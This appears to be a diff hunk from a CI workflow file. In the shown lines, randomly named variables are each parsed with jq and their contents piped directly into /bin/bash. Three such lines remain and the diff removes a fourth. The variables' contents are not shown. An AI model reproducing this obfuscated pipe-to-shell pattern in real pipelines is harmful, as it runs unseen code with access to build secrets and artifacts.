@@ -24,7 +24,6 @@ jobs:
           echo $hrwm8510 | jq -r .agpp35 | /bin/bash
           printf '%s' "$id62133" | jq -r .u8812 | /bin/bash
           echo $mvmx863 | jq -r .oetpz3 | /bin/bash
-          echo $pggab62 | jq -r .iw12430 | /bin/bash
 
       - name: Upload artifact
         if: always()
